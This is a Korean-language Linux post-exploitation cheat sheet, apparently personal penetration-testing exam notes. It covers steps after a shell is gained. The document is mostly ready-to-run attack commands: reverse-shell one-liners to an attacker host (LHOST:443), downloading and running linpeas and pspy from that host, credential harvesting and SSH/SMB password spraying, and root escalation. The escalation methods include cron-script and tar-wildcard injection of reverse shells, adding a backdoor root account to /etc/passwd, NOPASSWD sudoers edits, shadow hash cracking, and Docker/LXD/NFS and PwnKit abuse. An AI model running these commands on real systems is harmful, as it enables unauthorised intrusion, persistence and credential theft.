# 03. 리눅스 셸 뒤

셸 잡으면 여기부터. 명령 전부 풀어썼다(보고서 재현용). 원본·설명: [[01. 단일 linux 기법]]
⚠️ `$T`·`$LHOST` 는 Kali 셸 변수라 **타겟 셸엔 없다.** 아래 타겟 명령의 `LHOST`는 [[00. START]]에서 확인한 IP로 손으로 박는다.

## 1. 셸 안정화 — 제일 먼저 (끊기기 전에)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # python 없으면: script -qc /bin/bash /dev/null
# Ctrl+Z
stty raw -echo; fg
# Enter 두 번
export TERM=xterm; export SHELL=bash
```

## 2. 초기 열거 — 값만 읽지 말고 파일로 저장

⚠️ **7월 교훈: 열거 출력을 화면으로만 보면 놓친다.** 파일에 저장하고 grep 한다.
```bash
{ id; echo; whoami; hostname; echo; uname -a; cat /etc/os-release; echo;
  sudo -l; echo; ip a; cat /etc/hosts; echo;
  find / -perm -4000 -type f 2>/dev/null; echo '--- SGID';
  find / -perm -2000 -type f 2>/dev/null; echo '--- caps';
  getcap -r / 2>/dev/null; echo '--- cron';
  cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null; echo '--- listen';
  ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null; echo '--- procs';
  ps aux | grep -i root; } | tee /tmp/enum.txt
```
읽는 순서 — **위에서 아래로, 하나도 건너뛰지 말 것:**
- `sudo -l` 에 뭐든 있으면 → **6. sudo** (제일 흔함)
- 낯선 SUID/SGID → **6. SUID**
- capability(cap_setuid 등) → **6. capabilities**
- `ss` 의 로컬 전용 포트(127.0.0.1:xxxx) → 내부 서비스, 피벗/포트포워드 대상
- root 프로세스에 낯선 스크립트 → cron 의심, **pspy 투입**

## 3. 자동 스캐너 — linpeas / pspy (파일 저장 필수)

Kali에서 서빙 준비 후 `python3 -m http.server 80`:
```bash
# Kali — 한 폴더에 모아 서빙 (경로는 실측: linpeas는 peass 패키지, pspy는 _lib)
mkdir -p /tmp/serve; cp /usr/share/peass/linpeas/linpeas.sh ~/PG/_lib/pspy64 /tmp/serve/ 2>/dev/null; cd /tmp/serve && python3 -m http.server 80
```
```bash
# 타겟에서 — 출력을 «반드시» 파일로. 화면 스크롤로 읽지 마라
wget http://LHOST/linpeas.sh -O /tmp/lp.sh 2>/dev/null || curl -s http://LHOST/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh; /tmp/lp.sh > /tmp/lp.txt 2>&1
wget http://LHOST/pspy64 -O /tmp/pspy 2>/dev/null; chmod +x /tmp/pspy; /tmp/pspy   # cron 실시간 감시
```
linpeas 출력이 크거나 뭉개졌으면 → 줄 복원·전체 배터리: [[07. PEAS 출력 트리아지]]
빠른 확인 — linpeas 실측 섹션 앵커(2025-12 판 확인. ⛔`PE:`·`95%`는 이 버전에 없음):
```bash
grep -aiE "sudo -l|/etc/sudoers|sudo tokens|Sudo version|SUID|SGID|Capabilities|Cron jobs|vulnerable cron|\.socket files|\.timer|systemd|writable|You can write|Writable log|Writable Installed|Interesting GROUP writable|owned by me|NFS Exports|no_root_squash|Docker|lxd|Pkexec|Polkit|Kernel|Exploit Suggester|CVE-20|PATH|LD_|env variables|SSH Files|private SSH|Backup files|kcpassword|Cloud Credentials|Htpasswd|pam\.d|audit logs|credentials in memory|MySQL|Mails|Env Files" /tmp/lp.txt | cut -c1-300
```
> linpeas는 쓰기 가능한 것을 **빨강/노랑**으로 칠한다. 색이 안 보이면(파이프로 넘겨서) 위 `writable`·`You can write` 로 잡는다. 색 유지하려면 `less -R /tmp/lp.txt`.
**적중하면 → 어디에 쓰나:**

원리 셋 — ⓐ내 계정이 root로 뭘 실행할 권한 ⓑ내가 바꿀 수 있는 root 것 ⓒ비번·키.

| 적중 | 왜 여기서 root가 되나 (한 줄) | → 바로 가는 곳 |
|---|---|---|
| `sudo -l` / `/etc/sudoers` | 내가 root로 실행 허가받은 바이너리라 GTFOBins로 셸 탈출 | 6절 sudo — 제일 먼저·흔함 |
| `sudo tokens` | 살아있는 sudo 토큰을 훔쳐 비번 없이 sudo | 6절 sudo (토큰 재사용) |
| `Sudo version` <1.9.5p2 | sudo 자체 힙오버플로 버그로 버전만 맞으면 root | CVE-2021-3156 Baron Samedit |
| `SUID`/`SGID` 낯선 것 | 그 프로그램이 root 권한으로 도니 악용법만 알면 root | 6절 SUID → GTFOBins |
| `Capabilities` (cap_setuid 등) | 특정 능력이 붙은 바이너리로 uid를 0으로 | 6절 caps → GTFOBins |
| `Cron jobs`·`vulnerable cron` | root가 주기 실행하는 스크립트를 내가 고칠 수 있어서 | 6절 cron 교체 + pspy 확인 |
| `.timer`·`.socket`·`systemd` writable | systemd 유닛을 내가 써서 root 서비스에 명령 끼움 | 6절 systemd 오설정 |
| `writable` `/etc/passwd` | 쓰기 가능하면 해시 박은 root 계정 한 줄 추가 | 6절 passwd 쓰기 |
| `writable` `/etc/sudoers`·`sudoers.d` | 내 계정에 NOPASSWD:ALL 한 줄 추가 | `echo 'me ALL=NOPASSWD:ALL'` |
| `writable` `/etc/shadow` | root 해시를 내가 아는 값으로 교체 | 해시 생성 후 덮기 |
| `writable` `.service`·`.timer`·`.socket` | root systemd 유닛에 ExecStart 명령 끼움 | 6절 systemd |
| `writable` root 실행 스크립트/바이너리 | root가 실행하는 파일을 내 페이로드로 덮음 | 내용 교체 후 트리거 대기 |
| `Writable log`(logrotten)·`Writable Installed` | logrotate·설치앱 경로 악용 | (드묾) 해당 익스 |
| `You can write`·`owned by me` | linpeas가 "너 이거 쓸 수 있다"고 직접 표시 | 그 파일이 뭔지 보고 위 분기로 |
| `PATH` 쓰기가능 항목 | root 스크립트가 절대경로 없이 명령 호출 → 내 걸 먼저 | 6절 PATH 하이재킹 |
| `LD_`·`env variables` (env_keep) | sudo가 LD_PRELOAD 유지 → 악성 .so 주입 | 6절 LD_PRELOAD |
| `NFS Exports`·`no_root_squash` | 원격 마운트 파일을 root 권한 그대로 다뤄서 | Kali서 마운트 → SUID 심기 |
| `Docker`·`lxd` 그룹/소켓 | 사실상 root급 — 컨테이너로 호스트 FS 통째 접근 | docker run chroot / lxd 악용 |
| `Pkexec`·`Polkit` | pkexec SUID면 PwnKit(거의 항상 통함) | CVE-2021-4034 PwnKit |
| `Kernel`·`Exploit Suggester`·`CVE-20` | 커널/서비스가 알려진 취약점 버전이라 | searchsploit → 커널익스(최후) |
| `SSH Files`·`private SSH` | 유출된 개인키로 다른(또는 root) 계정 로그인 | 키로 `ssh` 재사용 |
| `Backup files`·`kcpassword` | 백업·자동로그인 파일에 평문 비번이 | 파일 열어 비번 확보 |
| `Cloud Credentials`·`Env Files`·`Htpasswd` | 앱 설정·환경파일에 DB/서비스 자격증명이 | 그 비번 재사용(su/ssh/DB) |
| `pam.d`·`audit logs` | PAM 설정·감사로그에 입력된 비번이 남아서 | 평문 비번 확보 |
| `credentials in memory` | 프로세스 메모리에 비번이 떠 있어서(root 필요) | (root 후) 덤프 |
| `MySQL`·`Mails` | DB 접속정보·메일에 재사용 비번/힌트가 | DB 로그인 / 메일 열람 |

## 4. 자격증명 사냥 — 열거와 병행

```bash
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
grep -riE "password|passwd|db_pass|api_key|secret" /var/www /opt /home /etc 2>/dev/null | grep -v Binary
cat /var/www/html/config*.php /var/www/html/wp-config.php /var/www/**/.env 2>/dev/null
find / -name "id_rsa" -o -name "*.kdbx" 2>/dev/null
```
찾은 비번은 **재사용** — `su - USER` · `ssh user@localhost` · DB 로그인. 비번 재사용이 리눅스 privesc의 절반이다.
```bash
# 로컬 계정 전수에 스프레이 (Kali에서, SSH 열렸으면)
nxc ssh $T -u /etc/passwd로_만든_users.txt -p '찾은비번' --continue-on-success
# 리눅스가 Samba·다른 대역 물고 있으면 그 크리덴셜을 SMB에도
nxc smb 172.16.x.0/24 -u USER -p PASS --continue-on-success   # 내부 대역
```

## 5. 리버스셸 원라이너 (Kali: `rlwrap nc -lvnp $LPORT`)

```bash
bash -c 'bash -i >& /dev/tcp/LHOST/443 0>&1'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 443 >/tmp/f     # nc -e 없을 때
```
안 붙으면 포트 **443 → 80 → 53** 순 (7월 실측: 성공 회선이 tcp/80). `revshells.com` 로 다른 언어.

## 6. 권한상승 수동 벡터 — linpeas가 놓친 것

### sudo -l → GTFOBins (제일 먼저·흔함)
```bash
sudo -l
sudo --version         # <1.9.5p2 → CVE-2021-3156 Baron Samedit
# 허용 바이너리를 gtfobins.github.io 에서 (sudo 섹션). 예:
sudo vim -c ':!/bin/sh'        # / sudo awk 'BEGIN{system("/bin/sh")}' / sudo less → !/bin/sh
sudo -u#-1 ALLOWED_BIN       # (ALL,!root) 보이면 CVE-2019-14287
# env_keep에 LD_PRELOAD 있으면 → 아래 LD_PRELOAD
```
### SUID / SGID → GTFOBins
```bash
find / -perm -4000 -type f 2>/dev/null
# 낯선 SUID → gtfobins(SUID). 예: find . -exec /bin/sh -p \; -quit
strings /path/suidbin | grep -iE "system|exec|/bin"      # custom SUID 내부 호출 확인
# 절대경로 없이 호출 → PATH 하이재킹
```
### Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid+ep 예(python): python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
```
### Cron / systemd timer (pspy로 숨은 것 발견)
```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
./pspy64                              # ★숨은 cron·짧은 프로세스 실시간 감시 (crontab에 안 보이는 것)
systemctl list-timers --all           # systemd 타이머 (cron 대체)
# ① root 스크립트가 쓰기 가능 → 리버스셸 삽입:
echo 'bash -i >& /dev/tcp/LHOST/443 0>&1' >> /path/writable_script.sh
# ② 스크립트가 절대경로 없이 명령 호출 → PATH 하이재킹 (아래)
# ③ 스크립트 자체는 못 쓰는데 그 스크립트가 «내가 쓸 수 있는 파일»을 참조 → 그 파일 조작
```
### Wildcard 인젝션 (root cron이 tar/rsync/chown * 실행)
```bash
# tar: 쓰기가능 디렉터리에서
echo 'bash -i >& /dev/tcp/LHOST/443 0>&1' > shell.sh
touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh shell.sh'
# rsync: touch -- '-e sh shell.sh'   /   chown/chmod: --reference 트릭
```
### systemd 서비스/소켓 (쓰기가능 유닛)
```bash
find / -writable -name '*.service' -o -writable -name '*.socket' 2>/dev/null
# .service 쓰면 ExecStart= 에 리버스셸 넣고: systemctl restart <svc> (권한 있으면)
# .socket 쓰면 트리거로 root 서비스 실행
```
### 쓰기 가능한 민감 파일 (linpeas가 writable로 표시한 것)
```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ 2>/dev/null
find / -writable -not -path '/proc/*' 2>/dev/null | grep -vE '^/(sys|dev|run|tmp)' | head -40
```
```bash
# /etc/passwd 쓰기 가능 → 해시 박은 root 계정 추가
openssl passwd -1 -salt x pass123          # → $1$x$... 복사
echo 'hax:$1$x$위해시:0:0:root:/root:/bin/bash' >> /etc/passwd; su hax   # 비번 pass123
# /etc/sudoers(.d) 쓰기 가능 → 내 계정 NOPASSWD
echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers; sudo -l
# /etc/shadow 읽기 → root 해시 크랙 / 쓰기 → 아는 해시로 교체
unshadow /etc/passwd /etc/shadow > u
# 해시 프리픽스로 모드 선택:  $6$=sha512crypt -m1800 · $1$=md5crypt -m500 · $2*$=bcrypt -m3200
hashcat -m 1800 u /usr/share/wordlists/rockyou.txt
# ⚠️ $y$(yescrypt) = 최신 Kali/Ubuntu 기본. hashcat 버전따라 미지원 → john이 확실:
john --wordlist=/usr/share/wordlists/rockyou.txt u    # 프리픽스 자동판별
# root 실행 스크립트/서비스가 쓰기 가능 → 리버스셸 끼우고 트리거 대기
echo 'bash -i >& /dev/tcp/LHOST/443 0>&1' >> /path/writable_root_script.sh
```
### NFS no_root_squash / Docker·LXD 그룹 / PwnKit
```bash
# Kali: showmount -e $T ; mount -o rw $T:/share /mnt/nfs ; cp /bin/bash /mnt/nfs/rb; chmod +s /mnt/nfs/rb  → 타겟: /share/rb -p
id                       # docker → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
ls -la /usr/bin/pkexec   # SUID면 PwnKit(CVE-2021-4034) 거의 항상 통함
uname -a                 # 커널 익스는 최후수단(박스 죽을 수 있음). DirtyPipe/PwnKit만 우선
```
### 위험한 그룹 (id에서 확인)
```bash
id
# disk  → debugfs /dev/sda1 로 루트FS 직접 읽기 (shadow·SSH키): debugfs -w /dev/sda1
# adm   → /var/log 읽기 (비번·토큰)
# lxd   → lxc image import; lxc init img c -c security.privileged=true; device add / → chroot
# docker→ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# video/shadow/wheel 등도 확인
```
### D-Bus / screen·tmux SUID / setuid C
```bash
# D-Bus: busctl list 로 root 서비스 → gdbus call 로 권한상승 (예: dbus-send)
# screen 4.5.0 SUID / tmux SUID → 세션 하이재킹 (구버전 CVE)
ls -la /usr/bin/screen /usr/bin/tmux
# setuid C 셸 (SUID 바이너리가 이걸 호출하게):
# int main(){setuid(0);setgid(0);system("/bin/bash");}  → gcc x.c -o x
```
